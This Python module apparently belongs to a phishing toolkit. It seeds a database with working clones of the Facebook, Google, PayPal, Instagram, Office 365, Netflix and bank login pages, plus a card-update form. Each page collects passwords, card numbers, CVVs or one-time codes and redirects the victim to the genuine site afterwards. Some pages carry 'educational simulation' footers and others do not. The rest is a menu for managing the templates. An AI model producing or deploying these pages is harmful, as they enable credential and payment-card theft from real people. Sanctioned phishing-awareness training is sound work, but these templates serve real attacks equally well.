import os
from utils import get_db, success, error, info, color_input, clear_screen, Fore, Style


def seed_builtin_pages():
    """Add realistic, responsive login clones if the landing_pages table is empty."""
    conn = get_db()
    existing = conn.execute("SELECT COUNT(*) FROM landing_pages").fetchone()[0]
    if existing > 0:
        conn.close()
        return

    pages = [
        (
            "Facebook Login",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – log in or sign up</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .box { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
  .logo { color: #1877f2; font-size: 36px; font-weight: bold; margin-bottom: 10px; }
  .subtitle { color: #606770; font-size: 16px; margin-bottom: 25px; }
  input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
  button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
  button:hover { background: #166fe5; }
  .links { margin-top: 20px; font-size: 14px; }
  .links a { color: #1877f2; text-decoration: none; display: inline-block; margin: 5px 0; }
  .footer { margin-top: 25px; font-size: 12px; color: #90949c; }
  @media (max-width: 480px) {
    .box { padding: 30px 20px; }
    .logo { font-size: 28px; }
  }
</style>
</head>
<body>
<div class="box">
  <div class="logo">facebook</div>
  <div class="subtitle">Log in to Facebook</div>
  <form method="post" action="/login">
    <input type="text" name="email" placeholder="Email address or phone number" required>
    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <div class="links">
    <a href="#">Forgotten account?</a> · <a href="#">Sign up for Facebook</a>
  </div>
  <div class="footer">Facebook © 2025</div>
</div>
</body>
</html>""",
            "https://www.facebook.com/",
        ),
        (
            "Google Sign-In",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in – Google Accounts</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .container { width: 100%; max-width: 420px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
  .logo { margin-bottom: 20px; }
  .logo img { max-width: 80px; height: auto; }
  h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 10px 0; }
  .subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
  input { width: 100%; padding: 14px 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
  button { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 24px; }
  button:hover { background: #1669c1; }
  .link { margin-top: 24px; font-size: 14px; }
  .link a { color: #1a73e8; text-decoration: none; }
  .footer { margin-top: 36px; font-size: 12px; color: #5f6368; }
  @media (max-width: 480px) {
    .container { padding: 32px 24px; }
  }
</style>
</head>
<body>
<div class="container">
  <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="75"></div>
  <h1>Sign in</h1>
  <p class="subtitle">with your Google Account</p>
  <form method="post" action="/login">
    <input type="text" name="email" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button type="submit">Next</button>
  </form>
  <div class="link"><a href="#">Forgot email?</a></div>
  <div class="footer">This is a phishing simulation – educational use only.</div>
</div>
</body>
</html>""",
            "https://accounts.google.com/",
        ),
        (
            "PayPal Checkout",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to your PayPal account</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #f7f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .card { background: white; width: 100%; max-width: 420px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); padding: 40px 30px; }
  .logo { text-align: center; font-size: 28px; color: #003087; font-weight: bold; margin-bottom: 30px; }
  input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #9da3a6; border-radius: 4px; font-size: 16px; }
  button { width: 100%; padding: 14px; background: #0070ba; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
  button:hover { background: #005ea6; }
  .link { text-align: center; margin-top: 20px; }
  .link a { color: #0070ba; text-decoration: none; font-size: 14px; }
  .footer { margin-top: 25px; font-size: 12px; color: #6c7378; text-align: center; }
  @media (max-width: 480px) {
    .card { padding: 30px 20px; }
  }
</style>
</head>
<body>
<div class="card">
  <div class="logo">PayPal</div>
  <form method="post" action="/login">
    <input type="text" name="email" placeholder="Email address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <div class="link"><a href="#">Forgotten your email or password?</a></div>
  <div class="footer">Educational simulation – not a real PayPal site.</div>
</div>
</body>
</html>""",
            "https://www.paypal.com/signin",
        ),
        (
            "Credit Card Update",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Payment Method</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #e6e6e6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .form { background: white; padding: 30px; border-radius: 8px; width: 100%; max-width: 450px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
  h2 { color: #333; margin-bottom: 25px; font-size: 24px; }
  label { font-weight: bold; font-size: 14px; display: block; margin-top: 15px; }
  input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
  .row { display: flex; gap: 10px; }
  .row > div { flex: 1; }
  button { width: 100%; padding: 14px; background: #d32f2f; color: white; border: none; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 25px; }
  button:hover { background: #b71c1c; }
  .disclaimer { font-size: 12px; color: #888; margin-top: 20px; text-align: center; }
  @media (max-width: 480px) {
    .row { flex-direction: column; gap: 0; }
  }
</style>
</head>
<body>
<div class="form">
  <h2>Update Your Payment Information</h2>
  <form method="post" action="/login">
    <label>Cardholder Name</label>
    <input type="text" name="card_name" placeholder="John Doe" required>
    <label>Card Number</label>
    <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
    <div class="row">
      <div>
        <label>Expiry</label>
        <input type="text" name="expiry" placeholder="MM/YY" required>
      </div>
      <div>
        <label>CVV</label>
        <input type="text" name="cvv" placeholder="123" required>
      </div>
    </div>
    <label>Email Address</label>
    <input type="email" name="email" required>
    <label>Password (for verification)</label>
    <input type="password" name="password" required>
    <button type="submit">Save Changes</button>
  </form>
  <div class="disclaimer">Simulation – educational only.</div>
</div>
</body>
</html>""",
            "https://www.paypal.com/myaccount/money/",
        ),
        (
            "Instagram Login",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .box { background: white; border: 1px solid #dbdbdb; padding: 40px 30px; width: 100%; max-width: 380px; text-align: center; border-radius: 1px; }
  .logo { font-family: 'Billabong', cursive; font-size: 40px; margin-bottom: 25px; color: #262626; }
  input { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; }
  button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; margin-top: 15px; cursor: pointer; }
  button:hover { background: #1877f2; }
  .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; display: flex; align-items: center; }
  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
  .divider span { margin: 0 15px; }
  .link { font-size: 14px; }
  .link a { color: #00376b; text-decoration: none; }
  @media (max-width: 480px) {
    .box { padding: 30px 20px; }
  }
</style>
</head>
<body>
<div class="box">
  <div class="logo">Instagram</div>
  <form method="post" action="/login">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <div class="divider"><span>OR</span></div>
  <div class="link"><a href="#">Forgot password?</a></div>
</div>
</body>
</html>""",
            "https://www.instagram.com/accounts/login/",
        ),
        (
            "Office 365 Login",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', sans-serif; background: #f3f2f1; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .card { background: white; padding: 44px; width: 100%; max-width: 400px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
  .mslogo { margin-bottom: 20px; }
  .mslogo img { width: 108px; max-width: 100%; }
  h2 { font-weight: 600; color: #1b1b1b; margin: 10px 0; }
  input { width: 100%; padding: 14px 12px; margin: 8px 0; border: 1px solid #605e5c; border-radius: 2px; font-size: 16px; }
  button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
  button:hover { background: #106ebe; }
  .link { margin-top: 20px; font-size: 13px; }
  .link a { color: #0078d4; text-decoration: none; }
  @media (max-width: 480px) {
    .card { padding: 30px 24px; }
  }
</style>
</head>
<body>
<div class="card">
  <div class="mslogo"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c15" alt="Microsoft" width="108"></div>
  <h2>Sign in</h2>
  <form method="post" action="/login">
    <input type="text" name="email" placeholder="Email, phone, or Skype" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Sign in</button>
  </form>
  <div class="link"><a href="#">Can’t access your account?</a></div>
</div>
</body>
</html>""",
            "https://login.microsoftonline.com/",
        ),
        (
            "Bank Login (Generic)",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Online Banking - Sign In</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #003366; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .box { background: white; padding: 40px 30px; border-radius: 8px; width: 100%; max-width: 380px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
  .logo { color: #003366; font-size: 28px; font-weight: bold; text-align: center; margin-bottom: 30px; }
  label { font-weight: bold; font-size: 14px; display: block; margin-top: 15px; }
  input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
  button { width: 100%; padding: 14px; background: #f5a623; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; margin-top: 25px; cursor: pointer; }
  button:hover { background: #e69500; }
  .footer { font-size: 12px; text-align: center; margin-top: 20px; color: #666; }
  @media (max-width: 480px) {
    .box { padding: 30px 20px; }
  }
</style>
</head>
<body>
<div class="box">
  <div class="logo">SecureBank</div>
  <form method="post" action="/login">
    <label>Username</label>
    <input type="text" name="username" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <label>Security Code</label>
    <input type="text" name="otp" placeholder="One-time code">
    <button type="submit">Sign In</button>
  </form>
  <div class="footer">FDIC Insured. Educational simulation only.</div>
</div>
</body>
</html>""",
            "https://www.chase.com/",
        ),
        (
            "Netflix Login",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix - Sign In</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .card { background: rgba(0,0,0,0.75); padding: 60px 68px 40px; border-radius: 4px; width: 100%; max-width: 400px; color: #fff; }
  h1 { font-weight: 500; font-size: 32px; margin-bottom: 28px; }
  input { width: 100%; padding: 16px; margin: 10px 0; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
  input::placeholder { color: #8c8c8c; }
  button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; margin-top: 30px; cursor: pointer; }
  button:hover { background: #f40612; }
  .help { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
  .help a { color: #b3b3b3; text-decoration: none; }
  @media (max-width: 480px) {
    .card { padding: 30px 24px; }
    h1 { font-size: 24px; }
  }
</style>
</head>
<body>
<div class="card">
  <h1>Sign In</h1>
  <form method="post" action="/login">
    <input type="text" name="email" placeholder="Email or phone number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Sign In</button>
  </form>
  <div class="help">
    <a href="#">Need help?</a>
    <a href="#">Sign up now</a>
  </div>
</div>
</body>
</html>""",
            "https://www.netflix.com/login",
        ),
        (
            "Generic Login with Error",
            """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Login</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #eceff1; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .panel { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
  h2 { color: #37474f; margin-bottom: 20px; }
  .alert { background: #ffebee; color: #b71c1c; padding: 12px; border-radius: 4px; margin-bottom: 25px; font-size: 14px; border-left: 4px solid #b71c1c; }
  input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #b0bec5; border-radius: 4px; font-size: 16px; }
  button { width: 100%; padding: 14px; background: #d32f2f; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
  button:hover { background: #b71c1c; }
  .link { margin-top: 20px; text-align: center; }
  .link a { color: #1565c0; font-size: 14px; text-decoration: none; }
  @media (max-width: 480px) {
    .panel { padding: 30px 20px; }
  }
</style>
</head>
<body>
<div class="panel">
  <h2>Account Verification Required</h2>
  <div class="alert">Your session has expired. Please log in again.</div>
  <form method="post" action="/login">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Verify & Log In</button>
  </form>
  <div class="link"><a href="#">Forgot credentials?</a></div>
</div>
</body>
</html>""",
            "https://www.google.com/",
        ),
    ]

    for name, content, redirect_url in pages:
        conn.execute(
            "INSERT INTO landing_pages (name, content, redirect_url) VALUES (?,?,?)",
            (name, content, redirect_url),
        )
    conn.commit()
    conn.close()
    success("Built‑in landing pages added to the database (responsive).")


# ---------- Existing menu functions (unchanged) ----------
def view_pages():
    conn = get_db()
    pages = conn.execute("SELECT id, name, redirect_url FROM landing_pages").fetchall()
    conn.close()
    if not pages:
        info("No landing pages found.")
        return
    print("\n{:<5} {:<25} {:<40}".format("ID", "Name", "Redirect URL"))
    print("-" * 80)
    for p in pages:
        print("{:<5} {:<25} {:<40}".format(p["id"], p["name"], p["redirect_url"]))


def add_page():
    path = color_input("Enter HTML file path: ").strip()
    if not os.path.isfile(path):
        error("File not found.")
        return
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    name = os.path.splitext(os.path.basename(path))[0]
    redirect_url = color_input(
        "Enter redirect URL after submission (e.g., https://www.google.com): "
    ).strip()
    if not redirect_url.startswith("http"):
        error("URL must start with http:// or https://")
        return
    conn = get_db()
    conn.execute(
        "INSERT INTO landing_pages (name, content, redirect_url) VALUES (?,?,?)",
        (name, content, redirect_url),
    )
    conn.commit()
    conn.close()
    success(f"Landing page '{name}' added.")


def remove_page():
    view_pages()
    pid = color_input("Enter page ID to remove (or 0 to cancel): ").strip()
    if pid == "0":
        return
    conn = get_db()
    conn.execute("DELETE FROM landing_pages WHERE id=?", (pid,))
    conn.commit()
    conn.close()
    success("Landing page removed.")


def landing_page_menu():
    seed_builtin_pages()
    while True:
        clear_screen()
        print(Fore.YELLOW + "[Landing Page Template]\n" + Style.RESET_ALL)
        print("[1] View Landing Pages")
        print("[2] Add New Landing Page")
        print("[3] Remove Landing Page")
        print("[4] Exit to Main Menu")
        choice = color_input("Choice: ").strip()
        if choice == "1":
            view_pages()
        elif choice == "2":
            add_page()
        elif choice == "3":
            remove_page()
        elif choice == "4":
            break
        else:
            error("Invalid choice.")
        input("\nPress Enter to continue...")
